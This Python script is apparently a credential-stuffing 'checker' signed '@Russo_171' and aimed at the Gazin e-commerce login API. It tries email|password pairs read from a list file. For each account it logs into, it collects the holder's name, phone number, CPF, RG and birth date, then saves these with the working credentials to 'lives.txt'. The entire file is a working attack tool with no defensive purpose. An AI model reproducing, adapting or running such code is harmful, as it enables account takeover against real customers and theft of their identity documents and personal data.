import requests
from colorama import Fore, Back, Style
#import os
import time




def trazer(string,start,end):
	str = string.split(start)
	str = str[1].split(end)
	return str[0]
	pass

print(f'''{Fore.GREEN}
      

 ██████  ██████  ██    ██ ███████ ███████  ██████           ██ ███████  ██ 
██    ██ ██   ██ ██    ██ ██      ██      ██    ██         ███      ██ ███ 
██ ██ ██ ██████  ██    ██ ███████ ███████ ██    ██          ██     ██   ██ 
██ ██ ██ ██   ██ ██    ██      ██      ██ ██    ██          ██    ██    ██ 
 █ ████  ██   ██  ██████  ███████ ███████  ██████  ███████  ██    ██    ██ 
                                                                           

''')

texto = open('lista.txt').readlines()

for x in texto:
    logins = x.strip()
    lista = logins.split('|')
    email = lista[0]
    senha = lista[1]
    
   
    s = requests.session()
   
    headers = {
        'Host': 'ecommerce-api.gazin.com.br',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'content-type': 'application/json;charset=utf-8',
        'canal': 'gazin-ecommerce',
        'sec-ch-ua-platform': '"Windows"',
        'accept': '*/*',
        'origin': 'https://www.gazin.com.br',
        'referer': 'https://www.gazin.com.br/',
        'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority': 'u=1, i',
    }

    json_data = {
        'password': f'{senha}',
        'email': f'{email}',
    }

    r1 = s.post('https://ecommerce-api.gazin.com.br/v1/canais/login', headers=headers, json=json_data).text
    
    if "access_token" in r1:
    
        token = trazer(r1, 'access_token":"', '"')
        
        headers = {
            'Host': 'ecommerce-api.gazin.com.br',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'authorization': f'Bearer {token}',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'canal': 'gazin-ecommerce',
            'sec-ch-ua-platform': '"Windows"',
            'accept': '*/*',
            'origin': 'https://www.gazin.com.br',
            'referer': 'https://www.gazin.com.br/',
            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i',
        }

        r2 = s.get('https://ecommerce-api.gazin.com.br/v1/canais/consumidores', headers=headers).text
        
        nome = trazer(r2, 'nome":"', '"')
        
        telddd = trazer(r2, 'telefone_ddd":"', '"')
        
        tel = trazer(r2, 'telefone":"', '"')
        
        telefone = f"({telddd}) " + tel
        
        sexo = trazer(r2, 'sexo":"', '"')
        
        cpf = trazer(r2, 'cpf":"', '"')
        
        rg = trazer(r2, 'rg":', '"')
        
        nasci = trazer(r2, 'data_nascimento":"', '"')
        
        conta_criada = trazer(r2, 'data_aceite_politica_privacidade":"', '"')
        
        dados = f"Nome = {nome} | Telefone = {telefone} | Sexo = {sexo} | CPF = {cpf} | RG = {rg} Data de Nascimento = {nasci} | Data de criação da conta = {conta_criada}"
    

        print(f'{Fore.GREEN}\n[+] Aprovado => {email}|{senha} => {dados} => Checker criado por: @Russo_171')
            
        f = open("lives.txt", "a")
        
        f.write(f"\n[+] Aprovado => {email}|{senha} => {dados} => Checker criado por: @Russo_171")
        
        f.close()
        
    else:

        print(f'{Fore.RED}\n[-] Reprovado => {email}|{senha} => Checker criado por: @Russo_171\n')

        f = open("dies.txt", "a")
        f.write(f"\n[-] Reprovado => {email}|{senha} => Checker criado por: @Russo_171")
        f.close()
        

